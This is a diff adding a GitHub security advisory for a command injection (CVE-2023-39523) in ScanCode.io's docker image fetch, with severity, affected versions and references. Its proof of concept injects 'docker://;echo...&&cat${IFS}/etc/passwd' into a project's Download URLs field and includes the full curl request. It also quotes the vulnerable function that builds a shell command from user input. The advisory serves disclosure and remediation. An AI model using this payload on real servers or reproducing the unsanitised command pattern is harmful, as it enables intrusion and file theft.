@@ -1,0 +1,76 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-2ggp-cmvm-f62f",
+  "modified": "2023-08-09T14:41:23Z",
+  "published": "2023-08-09T14:41:23Z",
+  "aliases": [
+    "CVE-2023-39523"
+  ],
+  "summary": "ScanCode.io command injection in docker image fetch process",
+  "details": "## Command Injection in docker fetch process\n\n### Summary\nA possible command injection in the docker fetch process as it allows to append malicious commands in the docker_reference parameter.\n\n\n### Details\nIn the function `scanpipe/pipes/fetch.py:fetch_docker_image`[1] the parameter `docker_reference` is user controllable. The `docker_reference` variable is then passed to the vulnerable function `get_docker_image_platform`. \n```python\ndef fetch_docker_image(docker_reference, to=None):\n    \"\"\"\n    code snipped ....\n    \"\"\"\n    platform_args = []\n    platform = get_docker_image_platform(docker_reference) # User controlled `docker_reference` passed\n   \"\"\"\n   code snipped...\n   \"\"\"\n```\n\nHowever, the `get_docker_image_plaform` function constructs a shell command with the passed `docker_reference`. The `pipes.run_command` then executes the shell command without any prior sanitization, making the function vulnerable to command injections. \n\n```python\ndef get_docker_image_platform(docker_reference):\n    \"\"\"\n    Return a platform mapping of a docker reference.\n    If there are more than one, return the first one by default.\n    \"\"\"\n    skopeo_executable = _get_skopeo_location()\n    \"\"\"\n    Constructing a shell command with user controlled variable `docker_reference`\n    \"\"\"\n    cmd = (\n        f\"{skopeo_executable} inspect --insecure-policy --raw --no-creds \"\n        f\"{docker_reference}\"\n    )\n\n    logger.info(f\"Fetching image os/arch data: {cmd}\")\n    exitcode, output = pipes.run_command(cmd) # Executing command\n    logger.info(output)\n    if exitcode != 0:\n        raise FetchDockerImageError(output)\n``` \n\nA malicious user who is able to create or add inputs to a project can inject commands. Although the command injections are blind and the user will not receive direct feedback without logs, it is still possible to cause damage to the server/container. The vulnerability appears for example if a malicious user adds a semicolon after the input of `docker://;`, it would allow appending malicious commands.\n\n### PoC\n\n1. Create a new project with following input `docker://;echo${IFS}\"PoC\"${IFS}&&cat${IFS}/etc/passwd` in the filed Download URLs\n![image](https://user-images.githubusercontent.com/122313513/258454691-7cabe100-f82d-44b9-99f2-5d6a0949e6c4.png)\n\n2. Check docker logs to see the command execution\n![image](https://user-images.githubusercontent.com/122313513/258455082-d7590b16-6fcb-4041-949f-2e20959db713.png)\n\n```bash\ncurl -i -s -k -X $'POST' \\\n    -H $'Host: localhost' -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: multipart/form-data; boundary=---------------------------2742275543734015476190112060' -H $'Content-Length: 923' -H $'Origin: http://localhost' -H $'DNT: 1' -H $'Connection: close' -H $'Referer: http://localhost/project/add/' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-User: ?1' \\\n    -b $'csrftoken=7H2chgA7jPHnXK0NNPftIoCW9z8SabKR' \\\n    --data-binary $'-----------------------------2742275543734015476190112060\\x0d\\x0aContent-Disposition: form-data; name=\\\"csrfmiddlewaretoken\\\"\\x0d\\x0a\\x0d\\x0ayslGuNnvWloFUEUCWI5VlMuZ60ZDDSkFvZdIBTNs50VSHeKfznaeT0WL5pXlDTUm\\x0d\\x0a-----------------------------2742275543734015476190112060\\x0d\\x0aContent-Disposition: form-data; name=\\\"name\\\"\\x0d\\x0a\\x0d\\x0apoc\\x0d\\x0a-----------------------------2742275543734015476190112060\\x0d\\x0aContent-Disposition: form-data; name=\\\"input_files\\\"; filename=\\\"\\\"\\x0d\\x0aContent-Type: application/octet-stream\\x0d\\x0a\\x0d\\x0a\\x0d\\x0a-----------------------------2742275543734015476190112060\\x0d\\x0aContent-Disposition: form-data; name=\\\"input_urls\\\"\\x0d\\x0a\\x0d\\x0adocker://;echo${IFS}\\\"PoC\\\"${IFS}&&cat${IFS}/etc/passwd\\x0d\\x0a-----------------------------2742275543734015476190112060\\x0d\\x0aContent-Disposition: form-data; name=\\\"pipeline\\\"\\x0d\\x0a\\x0d\\x0a\\x0d\\x0a-----------------------------2742275543734015476190112060\\x0d\\x0aContent-Disposition: form-data; name=\\\"execute_now\\\"\\x0d\\x0a\\x0d\\x0aon\\x0d\\x0a-----------------------------2742275543734015476190112060--\\x0d\\x0a' \\\n    $'http://localhost/project/add/'\n```\n\n**Mitigations**\nThe `docker_reference` input should be sanitized to avoid command injections and it is not recommend to create commands with user controlled input directly. \n\n\n**Tested on:**\n- Commit: Latest commit [bda3a70e0b8cd95433928db1fd4b23051bc7b7eb]\n- OS: Ubuntu Linux Kernel 5.19.0\n\n**References**\n[1] https://github.com/nexB/scancode.io/blob/main/scanpipe/pipes/fetch.py#L185\n",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "scancodeio"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "32.5.1"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "<= 32.5.0"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/nexB/scancode.io/security/advisories/GHSA-2ggp-cmvm-f62f"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-39523"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/nexB/scancode.io/commit/07ec0de1964b14bf085a1c9a27ece2b61ab6105c"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/nexB/scancode.io"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/nexB/scancode.io/blob/main/scanpipe/pipes/fetch.py#L185"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/nexB/scancode.io/releases/tag/v32.5.1"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-77"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-08-09T14:41:23Z",
+    "nvd_published_at": "2023-08-07T21:15:09Z"
+  }
+}
